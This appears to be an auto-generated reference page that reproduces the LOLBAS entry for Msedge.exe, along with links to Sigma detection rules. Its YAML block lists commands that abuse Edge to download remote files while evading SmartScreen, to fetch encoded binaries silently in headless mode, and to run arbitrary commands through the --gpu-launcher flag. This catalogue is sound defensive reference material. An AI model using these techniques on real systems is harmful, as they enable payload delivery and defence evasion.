---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Msedge.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `msedge.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msedge.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Msedge.exe](../../tools/windows/msedge.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | msedge.exe |
| name | Msedge.exe |
| type | tool |
| source | lolbas |
| url | https://twitter.com/mrd0x/status/1478116126005641220 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@mrd0x'
  Person: mr.d0x
Author: mr.d0x
Commands:
- Category: Download
  Command: msedge.exe {REMOTEURL:.exe.txt}
  Description: Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to
    avoid SmartScreen.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Download file from the internet
- Category: Download
  Command: msedge.exe --headless --enable-logging --disable-gpu --dump-dom "{REMOTEURL:.base64.html}" > {PATH:.b64}
  Description: Edge will silently download the file. File extension should be .html and binaries should be encoded.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Download file from the internet
- Category: Execute
  Command: msedge.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
  Description: Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command
  MitreID: T1218.015
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Executes a process under a trusted Microsoft signed binary
Created: 2022-01-20
Description: Microsoft Edge browser
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml
Full_Path:
- Path: c:\Program Files\Microsoft\Edge\Application\msedge.exe
- Path: c:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Name: Msedge.exe
Resources:
- Link: https://twitter.com/mrd0x/status/1478116126005641220
- Link: https://twitter.com/mrd0x/status/1478234484881436672
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msedge.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_msedge_arbitrary_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml
```
